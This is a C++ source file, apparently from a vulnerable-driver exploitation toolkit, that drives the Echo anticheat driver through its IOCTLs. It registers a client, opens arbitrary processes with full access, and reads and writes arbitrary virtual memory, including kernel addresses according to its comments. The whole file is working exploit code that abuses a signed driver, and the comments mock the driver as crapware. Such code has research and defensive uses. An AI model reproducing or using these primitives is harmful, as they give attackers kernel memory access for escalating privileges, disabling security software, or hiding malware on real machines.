/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       ECHODRV.CPP
*
*  VERSION:     1.40
*
*  DATE:        21 Oct 2023
*
*  Inspect Element LTD spyware (anticheat) driver interface.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

//
// Based on https://github.com/kite03/echoac-poc/tree/main/PoC
//

#include "global.h"
#include "idrv/echodrv.h"

HANDLE gEchoDrvClientHandle = NULL;

/*
* EchoDrvReadWriteVirtualMemory
*
* Purpose:
*
* Read/Write virtual memory via EchoDrv.
*
*/
BOOL WINAPI EchoDrvReadWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL DoWrite
)
{
    ECHODRV_COPYVM_REQUEST request;

    RtlSecureZeroMemory(&request, sizeof(request));

    if (DoWrite) {
        request.FromAddress = Buffer;
        request.ToAddress = (PVOID)VirtualAddress;
    }
    else {
        request.FromAddress = (PVOID)VirtualAddress;
        request.ToAddress = Buffer;
    }

    request.BufferSize = (SIZE_T)NumberOfBytes;
    request.ProcessHandle = gEchoDrvClientHandle;

    return supCallDriver(DeviceHandle,
        IOCTL_ECHODRV_COPYVM,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* EchoDrvWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via EchoDrv.
*
*/
BOOL WINAPI EchoDrvWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    return EchoDrvReadWriteVirtualMemory(DeviceHandle,
        VirtualAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* EchoDrvReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via EchoDrv.
*
*/
BOOL WINAPI EchoDrvReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    return EchoDrvReadWriteVirtualMemory(DeviceHandle,
        VirtualAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* EchoDrvRegisterDriver
*
* Purpose:
*
* Echo client registration routine.
*
*/
BOOL WINAPI EchoDrvRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(Param);

    BOOL bResult;
    ECHODRV_REGISTER regRequest;
    ECHODRV_OPENPROCESS_REQUEST procRequest;

    RtlSecureZeroMemory(&regRequest, sizeof(regRequest));

    //
    // Send empty buffer so this crapware driver will remember client pid to it global variable.
    // Theorerically this BS driver should do some crypto next-gen calculations but life is
    // not working as authors expected.
    //

    bResult = supCallDriver(DeviceHandle,
        IOCTL_ECHODRV_REGISTER,
        &regRequest,
        sizeof(regRequest),
        &regRequest,
        sizeof(regRequest));

    if (bResult) {

        //
        // Only to make MmCopyVirtualMemory work as it expects process object as param. 
        // 
        // However we are working with kernel VA and KernelMode processor mode is set by AC.
        //
        RtlSecureZeroMemory(&procRequest, sizeof(procRequest));

        procRequest.ProcessId = GetCurrentProcessId();
        procRequest.DesiredAccess = GENERIC_ALL;

        bResult = supCallDriver(DeviceHandle,
            IOCTL_ECHODRV_OPEN_PROCESS,
            &procRequest,
            sizeof(procRequest),
            &procRequest,
            sizeof(procRequest));

        if (bResult)
            gEchoDrvClientHandle = procRequest.ProcessHandle;

    }

    return bResult;
}

/*
* EchoDrvUnregisterDriver
*
* Purpose:
*
* Echo unregister routine.
*
*/
BOOL WINAPI EchoDrvUnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(DeviceHandle);
    UNREFERENCED_PARAMETER(Param);

    if (gEchoDrvClientHandle)
        NtClose(gEchoDrvClientHandle);

    return TRUE;
}

/*
* EchoDrvOpenProcess
*
* Purpose:
*
* Open process via Echo driver.
*
*/
BOOL WINAPI EchoDrvOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle)
{
    BOOL bResult = FALSE;
    ECHODRV_OPENPROCESS_REQUEST procRequest;

    RtlSecureZeroMemory(&procRequest, sizeof(procRequest));

    procRequest.ProcessId = HandleToUlong(ProcessId);
    procRequest.DesiredAccess = DesiredAccess;

    bResult = supCallDriver(DeviceHandle,
        IOCTL_ECHODRV_OPEN_PROCESS,
        &procRequest,
        sizeof(procRequest),
        &procRequest,
        sizeof(procRequest));

    *ProcessHandle = procRequest.ProcessHandle;

    return bResult;
}
